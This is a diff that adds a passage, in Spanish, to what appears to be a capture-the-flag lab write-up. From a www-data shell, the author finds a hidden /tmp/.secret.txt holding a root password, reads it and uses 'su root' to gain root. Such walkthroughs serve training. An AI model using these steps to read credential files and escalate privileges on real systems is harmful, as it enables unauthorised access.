@@ -130,3 +130,27 @@ www-data@d9fa4b4b8612:/var/www/html$ whoami
 whoami
 www-data
 ```
+Recordar que al principio nos habían dejado en la página principal que había un secreto en la ruto ***/tmp**, así que vamos a ver.
+```bash
+www-data@d9fa4b4b8612:/tmp$ ls -la
+ls -la
+total 12
+drwxrwxrwt 1 root root 4096 May 20 04:55 .
+drwxr-xr-x 1 root root 4096 May 20 04:55 ..
+-rw-r--r-- 1 root root   21 Apr 12 16:07 .secret.txt
+```
+Vemos que oculto hay un archivo **.secret.txt**.
+```bash
+www-data@d9fa4b4b8612:/tmp$ cat .secret.txt
+cat .secret.txt
+contraseñaderoot123
+```
+Parece que tenemos la contraseña de root, así que cambiamos de usuario utilizando la contraseña encontrada y ya tenemos acceso a la máquina como root.
+```bash
+www-data@d9fa4b4b8612:/tmp$ su root
+su root
+Password: contraseñaderoot123
+whoami
+root
+```
+
